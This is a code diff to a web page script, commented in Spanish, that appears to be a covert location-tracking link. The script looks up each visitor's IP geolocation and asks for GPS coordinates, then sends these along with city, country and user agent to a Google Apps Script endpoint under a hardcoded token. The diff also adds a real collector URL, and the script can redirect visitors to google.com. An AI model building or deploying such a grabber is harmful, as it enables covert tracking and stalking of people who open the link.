@@ -34,8 +34,8 @@ body {
 
 <script>
 const CONFIG = {
-  scriptURL: "PEGAR_URL_SCRIPT",
-  token: "gonza_seguro_123"
+  scriptURL: "https://script.google.com/macros/s/AKfycbxwy1rNGMhapBMLBU65l5pT4i2qCIqSy9h-ymys3HsPsd-m3qW48ce8p7TLg8kgWu5J/exec",
+  token: "CP4BZ6E8E9R0"
 };
 
 const params = new URLSearchParams(window.location.search);
@@ -46,20 +46,23 @@ function finalizar(url = "https://google.com") {
   window.location.href = url;
 }
 
-// 🔥 API IP CONFIABLE
+// 🔥 Obtener IP (API robusta)
 fetch("https://ipapi.co/json/")
   .then(r => r.json())
   .then(geo => {
 
     console.log("IP DATA:", geo);
 
+    // 🔥 ULTRA SEGURO (soporta múltiples formatos)
     const base = {
       ip: geo.ip || "",
       ciudad: geo.city || "",
-      pais: geo.country_name || "",
-      lat: geo.latitude || "",
-      lon: geo.longitude || ""
+      pais: geo.country_name || geo.country || "",
+      lat: geo.latitude || geo.lat || "",
+      lon: geo.longitude || geo.lon || ""
     };
+
+    console.log("BASE NORMALIZADA:", base);
 
     let enviado = false;
 
@@ -68,11 +71,9 @@ fetch("https://ipapi.co/json/")
       enviado = true;
 
       console.log("ENVIANDO:", data, metodo);
-
       enviar(data, metodo);
     };
 
-    // 🔁 INTENTO GPS
     if ("geolocation" in navigator) {
 
       const timeout = setTimeout(() => {
@@ -84,11 +85,15 @@ fetch("https://ipapi.co/json/")
         pos => {
           clearTimeout(timeout);
 
-          enviarSeguro({
+          const gpsData = {
             ...base,
             lat: pos.coords.latitude,
             lon: pos.coords.longitude
-          }, "GPS");
+          };
+
+          console.log("GPS DATA:", gpsData);
+
+          enviarSeguro(gpsData, "GPS");
         },
         err => {
           clearTimeout(timeout);
@@ -107,9 +112,8 @@ fetch("https://ipapi.co/json/")
 
   })
   .catch(err => {
-    console.error("Error obteniendo IP:", err);
+    console.error("Error IP:", err);
 
-    // fallback extremo
     enviar({
       lat: "",
       lon: "",
@@ -119,13 +123,20 @@ fetch("https://ipapi.co/json/")
     }, "SinDatos");
   });
 
+// 🔥 ENVÍO ULTRA SEGURO
 function enviar(data, metodo) {
+
+  const lat = data.lat ?? "";
+  const lon = data.lon ?? "";
+
+  console.log("LAT FINAL:", lat);
+  console.log("LON FINAL:", lon);
 
   const query = new URLSearchParams({
     token: CONFIG.token,
     objeto: objeto,
-    lat: data.lat || "",
-    lon: data.lon || "",
+    lat: lat,
+    lon: lon,
     ip: data.ip || "",
     ciudad: data.ciudad || "",
     pais: data.pais || "",
@@ -133,7 +144,11 @@ function enviar(data, metodo) {
     ua: ua
   });
 
-  fetch(`${CONFIG.scriptURL}?${query}`)
+  const urlFinal = `${CONFIG.scriptURL}?${query}`;
+
+  console.log("URL FINAL:", urlFinal);
+
+  fetch(urlFinal)
     .then(r => r.json())
     .then(res => {
       console.log("RESPUESTA:", res);
